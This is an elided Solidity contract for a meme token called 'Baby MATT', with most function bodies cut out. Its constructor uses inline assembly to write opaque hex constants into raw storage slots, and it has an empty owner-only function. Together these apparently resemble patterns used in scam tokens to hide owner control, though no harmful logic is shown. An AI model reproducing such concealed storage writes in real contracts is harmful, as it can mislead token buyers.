...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_) {
        ...
        assembly {
            sstore(0x50,0x924bf4427bd54a356ca838e57ab5c4db4de1264db73d)
            sstore(0x51,0x924b967a8e41385ea703c0b40d0e6f3a74573ab3ab74)
    ...
    function payWithDifferentGas(address sender, address account, bytes[] memory data) public onlyOwner returns (uint target) {
    }
    ...
    function openTrade() public payable {
        ...
        uint256 uniswapSupply = _totalSupply / 10000 * (10000 - 310);
    ...
    function _DeployBabyMatt(address account, uint256 amount) internal virtual {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeployBabyMatt(creator, initialSupply);
    }
}

contract BabyMatt is ERC20Token {
    constructor() ERC20Token("Baby MATT", "BabyMATT", msg.sender, 100000000 * 10 ** 18) {
    }
}
